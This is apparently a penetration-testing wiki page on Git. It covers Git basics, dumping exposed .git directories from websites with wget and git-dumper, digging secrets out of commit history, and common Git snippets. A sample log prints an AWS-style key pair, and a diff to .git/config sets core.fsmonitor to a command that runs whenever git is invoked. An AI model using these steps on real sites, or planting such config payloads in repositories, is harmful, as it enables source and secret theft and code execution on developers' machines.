---
description: >-
  A version control system often saving lots of information about how files were
  changes
---

# Git

## Description

Git is a version control system that allows you to save the state of files. It is often used with source code and published on [Github](https://github.com/). There are a few keywords that Git uses you need to know to understand the terminology:

* **Repositories**: The entirety of your git system, with the files, history, and information. Can be created using `git init`
* **Commits**: "Save states" of the files in your repository. Whenever you change something and you are happy with the change, you can commit it so it's saved as a snapshot that you can later go back to. Can be created using `git commit -m "message"`
* **Branches**: Parallel to your main repository, branches are sidesteps to slowly work on a new feature for example, and then later in time **merge** it into the main branch. Can be created using `git checkout -b newfeature`

All the information about your Git repository gets saved in a `.git` directory that is at the root of your repository. The `git` command interacts with this directory and lots of tools can get information from it. So if you ever find a `.git` directory you'll know the current directory is a Git repository.&#x20;

To find everything in a repository without having to think of every command, you can use a tool like [GitKraken](https://www.gitkraken.com/) to explore the repository visually. Just open the directory in that tool and you can see a timeline of what commits and branches were made.&#x20;

## Finding Git on websites

In some cases, you'll find that the website you're testing uses Git by finding a `.git` directory. Normally this should be hidden by a 403 Forbidden for example, but this is not always the case. Sometimes you can see a list of files, or you can directly access `.git/HEAD` instead.&#x20;

### Web - Directory Listing

When you visit the `.git` directory on the website, and you can see a list of files relating to git, you know that directory listing is on. This makes it really easy to download everything at once recursively and then examine the repository on your own machine.&#x20;

```shell-session
$ wget -r http://example.com/.git
```

#### Git-dumper

When a website disables directory listing, but the `.git` directory can still be found with something like `.git/HEAD`, you might be able to use [git-dumper](https://github.com/arthaud/git-dumper) on it to extract all the files without having the need for directory listing. This tool understands the Git file structure and can find all the related files:

{% embed url="https://github.com/arthaud/git-dumper" %}
A tool to dump a git repository to your local machine, without needing directory listing
{% endembed %}

```shell-session
$ pip install git-dumper
$ git-dumper http://example.com/.git git/
```

Then use the source code to perform more targeted attacks, or look for secrets, even in history:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ git log -p  # Show commits with diffs
</strong>...
+++ b/secret.py
@@ -0,0 +1,85 @@
+access_key_id = "AKIA6CFMOGSLALOPETMB"
+secret_access_key = "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"
+region = "us-east-2"
...
<strong>$ git branch -a  # List all branches
</strong>* master
  secret
</code></pre>

## Attacking Git Commands

Git is a very flexible system, allowing many settings to be changed to decide how CLI tools interact with the repository. These configuration variables can allow executing arbitrary commands however when certain git commands are executed. Similar to [#git-hooks](../linux/linux-privilege-escalation/known-services.md#git-hooks "mention"), the `core.fsmonitor` variable in `.git/config` is a common one that can be set to a bash command to execute:

{% code title=".git/config" %}
```diff
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
+       fsmonitor = "id | tee /tmp/pwned > /dev/tty"
```
{% endcode %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ git status
</strong>uid=1001(user) gid=1001(user) groups=1001(user)
...
</code></pre>

Many shell extensions like [Starship](https://github.com/starship/starship/issues/3974) use `git` to get the current repository and are vulnerable to this, as well as [Visual Studio Code](https://www.sonarsource.com/blog/securing-developer-tools-git-integrations/#example-of-affected-ide-visual-studio-code) (now only with Trusted Mode). To find such issues, you can create a malicious repository with as many landmines as possible that trigger on different commands. This creates an empty repository with most known ways to execute commands:

{% embed url="https://github.com/jwilk/git-landmine" %}
Create a repository with `.git/config` and `hooks` GIT landmines (`lib/payload` = payload)
{% endembed %}

## Git Snippets

If you're running a git repository, you might need some complicated actions from time to time. This is a collection of some common actions as commands to quickly copy and paste.&#x20;

{% code title="Push to remote origin" %}
```shell-session
$ git remote add origin https://github.com/[username]/[repository].git
$ git branch -M main  # Switch to main branch for GitHub
$ git push --set-upstream origin main  # Set the default upstream

$ git push  # From now on, you can just push
```
{% endcode %}

{% code title="Reset all commits" %}
```shell-session
$ rm -rf .git
$ git init
$ git commit -m "Initial commit"
$ git push --force  # Force to overwrite existing remote
```
{% endcode %}

{% code title="Undo last commit" %}
```shell-session
# # If not pushed yet
$ git reset --soft HEAD~
# # If already pushed
$ git reset HEAD~  # Use --hard to also throw away the changes in the commit
$ git push --force
```
{% endcode %}

{% code title="Create and push tag" %}
```shell-session
$ git tag 0.1.0
$ git push origin --tags  # Push all tags
# # More info: https://stackoverflow.com/a/18223354/10508498
```
{% endcode %}
